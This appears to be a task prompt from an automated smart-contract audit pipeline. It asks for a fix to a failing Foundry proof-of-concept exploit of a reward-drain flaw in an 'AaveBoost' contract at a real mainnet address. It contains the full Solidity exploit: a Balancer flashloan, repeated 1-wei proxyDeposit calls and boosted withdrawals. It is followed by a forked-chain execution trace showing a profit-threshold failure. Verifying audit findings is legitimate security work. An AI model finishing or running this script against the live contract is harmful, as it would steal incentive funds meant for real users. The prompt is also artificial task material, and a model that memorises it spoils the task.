You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Unrestricted fixed reward can be sybil-drained with dust deposits
- claim: Whenever `AaveBoost` holds at least `REWARD` AAVE, `proxyDeposit` always adds a full `REWARD` subsidy to the deposit while charging the caller only `amount`. Because there is no minimum deposit size, per-user quota, cooldown, or access control, any account can repeatedly submit dust-sized deposits for itself and capture nearly the entire subsidy reserve.
- impact: An attacker can convert the contract's full reward inventory into attacker-owned pool deposits at negligible cost, stealing all incentives intended for real users.
- exploit_paths: ["Fund `AaveBoost` with reward AAVE", "Attacker calls `proxyDeposit(aave, attacker, 1)` repeatedly", "Each call transfers only the dust `amount` from the attacker but deposits `amount + REWARD` for the attacker", "Attacker later withdraws the boosted pool position, repeating until the contract balance drops below `REWARD`"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IAaveBoostLike {
    function aave() external view returns (address);
    function pool() external view returns (address);
    function REWARD() external view returns (uint128);
    function proxyDeposit(address asset, address recipient, uint128 amount) external;
}

interface IAavePoolLike {
    function withdraw(address asset, address recipient, uint128 amount, bool claim) external;
}

interface IBalancerVaultLike {
    function flashLoan(
        address recipient,
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        bytes memory userData
    ) external;
}

interface IFlashLoanRecipientLike {
    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory userData
    ) external;
}

contract FlawVerifier is IFlashLoanRecipientLike {
    address internal constant TARGET = 0xd2933c86216dC0c938FfAFEca3C8a2D6e633e2cA;
    address internal constant BALANCER_VAULT = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    uint128 internal constant DUST_AMOUNT = 1;

    address internal _profitToken;
    uint256 internal _profitAmount;
    bool internal _executing;

    constructor() {}

    function executeOnOpportunity() external {
        IAaveBoostLike boost = IAaveBoostLike(TARGET);
        address tokenAddress = boost.aave();
        uint256 reward = uint256(boost.REWARD());

        _profitToken = tokenAddress;
        _profitAmount = 0;

        // If the target has no configured subsidy or is not currently funded,
        // the stated exploit path cannot start on this fork.
        if (reward == 0) {
            return;
        }

        IERC20Like token = IERC20Like(tokenAddress);
        uint256 boostBalance = token.balanceOf(TARGET);
        if (boostBalance < reward) {
            return;
        }

        uint256 beforeBalance = token.balanceOf(address(this));
        uint256 requiredDust = uint256(DUST_AMOUNT);

        if (beforeBalance >= requiredDust) {
            _drainRewards(token, boost, boostBalance, reward);
        } else {
            IERC20Like[] memory tokens = new IERC20Like[](1);
            tokens[0] = token;

            uint256[] memory amounts = new uint256[](1);
            amounts[0] = requiredDust;

            // The exploit only needs transient access to a dust amount of AAVE.
            // A public flash loan is a realistic way to source that dust without
            // privileged balance injection and preserves the same exploit causality:
            // funded reward reserve -> repeated dust proxyDeposit calls -> boosted
            // withdrawals back to the attacker.
            IBalancerVaultLike(BALANCER_VAULT).flashLoan(address(this), tokens, amounts, "");
        }

        uint256 afterBalance = token.balanceOf(address(this));
        if (afterBalance > beforeBalance) {
            _profitAmount = afterBalance - beforeBalance;
        }
    }

    function receiveFlashLoan(
        IERC20Like[] memory tokens,
        uint256[] memory amounts,
        uint256[] memory feeAmounts,
        bytes memory
    ) external override {
        require(msg.sender == BALANCER_VAULT, "not-vault");
        require(!_executing, "reentered");

        _executing = true;

        IERC20Like token = tokens[0];
        uint256 amount = amounts[0];
        uint256 fee = feeAmounts[0];

        IAaveBoostLike boost = IAaveBoostLike(TARGET);
        uint256 reward = uint256(boost.REWARD());
        uint256 boostBalance = token.balanceOf(TARGET);
        if (reward != 0 && boostBalance >= reward) {
            _drainRewards(token, boost, boostBalance, reward);
        }

        require(token.transfer(BALANCER_VAULT, amount + fee), "repay-failed");
        _executing = false;
    }

    function _drainRewards(
        IERC20Like token,
        IAaveBoostLike boost,
        uint256 startingBoostBalance,
        uint256 reward
    ) internal {
        require(!_executing || msg.sender == BALANCER_VAULT, "bad-context");

        IAavePoolLike pool = IAavePoolLike(boost.pool());
        require(token.approve(TARGET, type(uint256).max), "approve-failed");

        // Path-aligned execution:
        // 1) AaveBoost already holds enough AAVE to pay fixed rewards.
        // 2) The attacker repeatedly calls proxyDeposit(aave, attacker, 1).
        // 3) Each call only pulls the 1-wei dust amount from the attacker, while
        //    AaveBoost deposits dust + REWARD for the attacker.
        // 4) The attacker immediately withdraws that boosted pool position.
        // 5) Repeat until AaveBoost's AAVE balance falls below REWARD.
        //
        // Each successful round reduces AaveBoost's own AAVE balance by exactly
        // REWARD, because the dust amount is transferred in and then included in
        // the pool deposit that is later withdrawn by the attacker.
        uint256 rounds = startingBoostBalance / reward;
        uint256 withdrawAmount256 = reward + uint256(DUST_AMOUNT);
        require(withdrawAmount256 <= type(uint128).max, "withdraw-too-large");
        // forge-lint: disable-next-line(unsafe-typecast)
        uint128 withdrawAmount = uint128(withdrawAmount256);

        for (uint256 index = 0; index < rounds; ++index) {
            boost.proxyDeposit(address(token), address(this), DUST_AMOUNT);
            pool.withdraw(address(token), address(this), withdrawAmount, false);
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }
}

```

forge stdout (tail):
```
c378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000429d069189e0001
    │   │   │   │   │   └─ ← [Stop]
    │   │   │   │   ├─ [6552] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 300000000000000001 [3e17])
    │   │   │   │   │   ├─ [5782] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 300000000000000001 [3e17]) [delegatecall]
    │   │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │   │        topic 1: 0x000000000000000000000000f36f3976f288b2b4903aca8c177efc019b81d88b
    │   │   │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000429d069189e0001
    │   │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   ├─  emit topic 0: 0xf341246adaac6f497bc2a656f546ab9e182111d630394f0c57c710a59a2cb567
    │   │   │   │   │        topic 1: 0x0000000000000000000000007fc66500c84a76ad7e9c93437bfc5ac33e2ddae9
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000429d069189e000100000000000000000000000000000000000000000000000000000000684a38cb
    │   │   │   │   └─ ← [Stop]
    │   │   │   ├─ [6552] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 1)
    │   │   │   │   ├─ [5782] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::transfer(0xBA12222222228d8Ba445958a75a0704d566BF2C8, 1) [delegatecall]
    │   │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │   │        topic 2: 0x000000000000000000000000ba12222222228d8ba445958a75a0704d566bf2c8
    │   │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   │   │   └─ ← [Return] true
    │   │   │   │   └─ ← [Return] true
    │   │   │   └─ ← [Stop]
    │   │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [staticcall]
    │   │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8) [delegatecall]
    │   │   │   │   └─ ← [Return] 620561284914039280534357 [6.205e23]
    │   │   │   └─ ← [Return] 620561284914039280534357 [6.205e23]
    │   │   ├─  emit topic 0: 0x0d7d75e01ab95780d3cd1c8ec0dd6c2ce19e3a20427eec8bf53283b6fb8e95f0
    │   │   │        topic 1: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │        topic 2: 0x0000000000000000000000007fc66500c84a76ad7e9c93437bfc5ac33e2ddae9
    │   │   │           data: 0x00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Stop]
    │   ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 48900000000000000000 [4.89e19]
    │   │   └─ ← [Return] 48900000000000000000 [4.89e19]
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9
    ├─ [1373] 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   ├─ [638] 0x5D4Aa78B08Bc7C530e21bf7447988b1Be7991322::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   └─ ← [Return] 48900000000000000000 [4.89e19]
    │   └─ ← [Return] 48900000000000000000 [4.89e19]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22685443 [2.268e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 2491)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.97s (267.28ms CPU time)

Ran 1 test suite in 3.05s (2.97s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 26942614)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
